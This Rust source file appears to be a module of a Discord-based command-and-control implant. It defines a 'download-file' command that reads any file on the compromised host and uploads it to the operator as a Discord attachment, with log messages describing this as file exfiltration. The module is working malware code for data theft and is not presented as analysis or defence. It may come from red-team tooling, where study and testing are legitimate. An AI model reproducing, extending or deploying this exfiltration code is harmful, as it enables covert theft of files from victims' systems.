use crate::{
    discord_utils::bot_functions::{send_follow_up_response, send_interaction_response},
    errors::DiscordC2Error,
    os::process_handler::ProcessHandler,
    session::SHELL_TYPE,
};

use std::{
    borrow::Cow,
    path::{Path, PathBuf},
};

use serenity::{
    builder::CreateApplicationCommand,
    client::Context,
    model::{
        application::{
            command::CommandOptionType,
            interaction::application_command::{
                ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue,
            },
        },
        channel::AttachmentType,
    },
};

use tokio::fs::File;
use tracing::{error, info as informational};

pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    command
        .name("download-file")
        .description("Downloads a file from the remote host.")
        .create_option(|option| {
            option
                .name("file-path")
                .kind(CommandOptionType::String)
                .description(
                    "Relative to the working directory of the session, or an absolute path",
                )
                .required(true)
        })
}

pub async fn run(
    options: &[CommandDataOption],
) -> Result<Option<AttachmentType<'static>>, DiscordC2Error> {
    let options = options.to_owned();
    let option = options
        .get(0)
        .ok_or_else(|| DiscordC2Error::InvalidInput("Expected download options".to_string()))?
        .resolved
        .clone()
        .ok_or_else(|| DiscordC2Error::InvalidInput("File path option not found.".to_string()))?;

    if let CommandDataOptionValue::String(file_path) = option {
        // Validate the file path and make sure it actually exists
        let path = path_validator(file_path.as_str()).await?;
        let attachment = file_to_attachment(path).await?;

        Ok(Some(attachment))
    } else {
        Ok(None)
    }
}

async fn path_validator(file_path: &str) -> Result<PathBuf, DiscordC2Error> {
    let shell_type = SHELL_TYPE.lock().await;
    let process_handler = match shell_type.as_ref() {
        Some(shell_type) => ProcessHandler::instance(shell_type).await,
        None => Err(DiscordC2Error::InvalidInput(
            "Shell type not found.".to_string(),
        )),
    }?;

    // Should return a DiscordC2Error::RegexError if not successful
    let directory = process_handler.current_working_directory().await?;

    // Path is an absolute path and was found
    if Path::new(file_path).exists() {
        Ok(Path::new(file_path).to_path_buf())
    }
    // Path is relative to the WD of the shell and was found
    else if Path::new(&directory).join(file_path).exists() {
        Ok(Path::new(&directory).join(file_path))
    }
    // Path was not found
    else {
        Err(DiscordC2Error::NotFound(file_path.to_string()))
    }
}

async fn file_to_attachment(file_path: PathBuf) -> Result<AttachmentType<'static>, DiscordC2Error> {
    // The read function will read the entire file into a Vec<u8>
    let final_bytes = tokio::fs::read(&file_path).await?;

    // Read the file's metadata, to determine size.
    let file = File::open(&file_path).await?;
    let metadata = file.metadata().await?;

    // We will eventually support exfil to external services here. Capping downloads to 25mb for now.
    if metadata.len() >= 25 * (1024 * 1024) {
        return Err(DiscordC2Error::InternalError(format!(
            "File size is too large: ({} bytes)",
            metadata.len()
        )));
    }

    let file_name = file_path
        .file_name()
        .ok_or(DiscordC2Error::InvalidInput(
            "File name not found.".to_string(),
        ))?
        .to_str()
        .ok_or(DiscordC2Error::InternalError(
            "Couldn't convert the file name to a string".to_string(),
        ))?;

    Ok(AttachmentType::Bytes {
        data: Cow::from(final_bytes),
        filename: file_name.to_string(),
    })
}

/// Handles the download command by sending an interaction response, downloading the file,
/// and sending the file as a follow-up response.
///
/// # Arguments
///
/// * `ctx` - The Context of the command.
/// * `command` - The ApplicationCommandInteraction representing the command.
///
/// # Returns
///
/// Returns `Ok(())` if the operation is successful, or an `Err(DiscordC2Error)` if there
/// is an error during the process.
///
/// # Examples
///
/// ```
/// let ctx = Context::new();
/// let command = ApplicationCommandInteraction::new();
/// let result = download_handler(&ctx, &command).await;
/// assert!(result.is_ok());
/// ```
pub async fn download_handler(
    ctx: &Context,
    command: &ApplicationCommandInteraction,
) -> Result<(), DiscordC2Error> {
    let response = send_interaction_response(ctx, command, "Downloading file...", None).await?;
    let attachment = run(&command.data.options).await;

    let ctx1 = ctx.clone();

    match attachment {
        Ok(Some(attachment)) => {
            informational!("Beginning file exfiltration...");
            tokio::spawn(async move {
                if let Err(why) = send_follow_up_response(
                    &ctx1,
                    &response,
                    "Successfully exfiltrated the file!",
                    Some(attachment),
                )
                .await
                {
                    error!("Error sending follow up response: {}.", why);
                }

                if let Err(why) = response
                    .delete_original_interaction_response(&ctx1.http)
                    .await
                {
                    error!("Error deleting original interaction response: {}.", why);
                }
                informational!("Succesfully exfiltrated the file.");
            });
        }
        Err(reason) => {
            error!("Failed to exfiltrate the file: {}", reason);
            send_follow_up_response(
                ctx,
                &response,
                format!("Failed to exfiltrate the file: `{}`", reason),
                None,
            )
            .await?;
            response
                .delete_original_interaction_response(&ctx.http)
                .await?;
        }
        _ => return Ok(()),
    }
    Ok(())
}
